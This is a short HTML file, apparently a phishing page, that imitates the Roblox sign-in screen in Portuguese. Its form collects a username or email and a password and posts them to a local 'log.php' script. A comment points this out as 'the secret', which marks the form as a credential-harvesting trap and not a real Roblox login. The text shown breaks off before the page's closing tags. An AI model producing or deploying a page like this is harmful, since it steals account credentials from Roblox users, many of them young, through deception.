<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Entrar | Roblox</title>
    <style>
        body { background-color: #232527; color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #393b3d; padding: 20px; border-radius: 8px; width: 300px; text-align: center; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
        input { width: 90%; padding: 12px; margin: 10px 0; border: none; border-radius: 5px; font-size: 16px; }
        button { width: 100%; padding: 12px; background: white; color: black; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 16px; }
        h2 { margin-bottom: 15px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Entrar</h2>
        <!-- O segredo está aqui: action="log.php" -->
        <form method="POST" action="log.php">
            <input type="text" name="username" placeholder="Nome de usuário ou email" required>
            <input type="password" name="password" placeholder="Senha" required>
            <button type="submit">Entrar</button>
        </form>
    </div>
